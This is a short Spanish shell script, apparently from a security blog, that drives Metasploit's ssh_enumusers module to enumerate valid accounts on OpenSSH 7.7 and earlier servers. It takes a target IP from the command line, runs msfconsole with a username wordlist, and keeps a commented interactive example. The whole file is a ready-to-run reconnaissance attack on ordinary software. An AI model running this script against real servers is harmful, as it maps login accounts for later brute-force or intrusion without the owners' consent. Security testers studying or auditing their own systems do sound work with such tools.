#!/bin/sh
# Ver usuarios existentes en OpenSSH 7.7 y versiones anteriores
# Antonio Taboada - hackingyseguridad.com 2025
# OpenSSH < 7.7 - User Enumeration
# Descargar diccionario de usuarios

echo
echo "Enumeración de usuarios SSH, versiones OpenSSH 7.7 y anteriores"
echo
echo "..."
sh actualizar.sh

echo
echo "Enumeración de usuarios SSH, versiones OpenSSH 7.7 y anteriores"
echo
echo "..."
echo

if [ -z "$1" ]; then
    echo "Uso: $0 <IP>"
    echo "Ejemplo: $0 192.168.1.100"
    exit 1
fi

msfconsole -q -x "
use auxiliary/scanner/ssh/ssh_enumusers;
set RHOSTS $1;
set RPORT 22;
set USER_FILE /home/antonio/ssha/usuarios.txt;
run;
exit;
"

#
# modo consola
#
# msfconsole -q
# use auxiliary/scanner/ssh/ssh_enumusers
# set RHOSTS 192.168.1.100
# set RPORT 2222
# set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
# run



